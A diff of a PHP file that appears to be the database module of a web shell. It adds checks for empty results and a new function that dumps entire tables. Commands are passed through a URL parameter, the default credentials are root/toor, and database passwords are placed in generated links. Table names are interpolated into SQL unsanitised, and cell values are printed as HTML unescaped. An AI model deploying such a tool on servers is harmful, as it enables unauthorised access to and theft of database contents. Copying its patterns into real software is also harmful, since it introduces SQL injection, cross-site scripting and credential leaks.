@@ -462,11 +462,15 @@
         if ($dbh) {
             try {
                 $output = $dbh->query("SHOW DATABASES;");
-                echo "<ul>";
-                while ($row = $output->fetch(PDO::FETCH_ASSOC)) {
-                    echo '<li><a href="' . $_SERVER['PHP_SELF'] . '?action=submit&command=db%20' . $username . '%20' . $password . '%20' . $server . '%20' . $port . '%20' . $row["Database"] . '%20tables">' . $row["Database"] . '</a></li>';
+                if ($output == false) {
+                    echo "<p class='error'>Empty result</p>";
+                } else {
+                    echo "<ul>";
+                    while ($row = $output->fetch(PDO::FETCH_ASSOC)) {
+                        echo '<li><a href="' . $_SERVER['PHP_SELF'] . '?action=submit&command=db%20' . $username . '%20' . $password . '%20' . $server . '%20' . $port . '%20' . $row["Database"] . '%20tables">' . $row["Database"] . '</a></li>';
+                    }
+                    echo "</ul>";
                 }
-                echo "</ul>";
             } catch (PDOException $e) {
                 echo "<p class='error'>" . $e->getMessage() . "</p>";
             }
@@ -483,23 +487,66 @@
         $database = ((count($argv) > 0) ? array_shift($argv) : "information_schema");
         $comm = ((count($argv) > 0) ? array_shift($argv) : "");
         echo "<h3>Available Tables in $database</h3>";
-        echo "<pre>";
         $dbh = db_connect($username, $password, $database, $server, $port);
         if ($dbh) {
             try {
                 $output = $dbh->query("SHOW TABLES;");
-                echo "<ul>";
-                while ($row = $output->fetch(PDO::FETCH_NUM)) {
-                    echo '<li><a href="' . $_SERVER['PHP_SELF'] . '?action=submit&command=db%20' . $username . '%20' . $password . '%20' . $server . '%20' . $port . '%20' . $database . '%20select%20' . $row[0] . '">' . $row[0] . '</a></li>';
+                if ($output == false) {
+                    echo "<p class='error'>Empty result</p>";
+                } else {
+                    echo "<ul>";
+                    while ($row = $output->fetch(PDO::FETCH_NUM)) {
+                        echo '<li><a href="' . $_SERVER['PHP_SELF'] . '?action=submit&command=db%20' . $username . '%20' . $password . '%20' . $server . '%20' . $port . '%20' . $database . '%20select%20' . $row[0] . '">' . $row[0] . '</a></li>';
+                    }
+                    echo "</ul>";
                 }
-                echo "</ul>";
             } catch (PDOException $e) {
                 echo "<p class='error'>" . $e->getMessage() . "</p>";
             }
         } else {
             echo "<p class='error'>the database handle is empty</p>";
         }
-        echo "</pre>";
+    }
+    
+    function command_db_select($argv=array()) {
+        $username = ((count($argv) > 0) ? array_shift($argv) : "root");
+        $password = ((count($argv) > 0) ? array_shift($argv) : "toor");
+        $server = ((count($argv) > 0) ? array_shift($argv) : "localhost");
+        $port = ((count($argv) > 0) ? array_shift($argv) : "3306");
+        $database = ((count($argv) > 0) ? array_shift($argv) : "information_schema");
+        $comm = ((count($argv) > 0) ? array_shift($argv) : "");
+        $table = ((count($argv) > 0) ? array_shift($argv) : "ENABLED_ROLES");
+        echo "<h3>Contents of $database.$table</h3>";
+        $dbh = db_connect($username, $password, $database, $server, $port);
+        if ($dbh) {
+            try {
+                $output = $dbh->query("SELECT * FROM $table;");
+                if ($output == false) {
+                    echo "<p class='error'>Empty result</p>";
+                } else {
+                    echo "<table>";
+                    $firstLine = true;
+                    while ($row = $output->fetch(PDO::FETCH_ASSOC)) {
+                        if ($firstLine) {
+                            foreach(array_keys($row) as $header) {
+                                echo "<th>$header</th>";
+                            }
+                            $firstLine = false;
+                        }
+                        echo "<tr>";
+                        foreach($row as $cell) {
+                            echo "<td>$cell</td>";
+                        }
+                        echo "</tr>";
+                    }
+                    echo "</table>";
+                }
+            } catch (PDOException $e) {
+                echo "<p class='error'>" . $e->getMessage() . "</p>";
+            }
+        } else {
+            echo "<p class='error'>the database handle is empty</p>";
+        }
     }
     
     
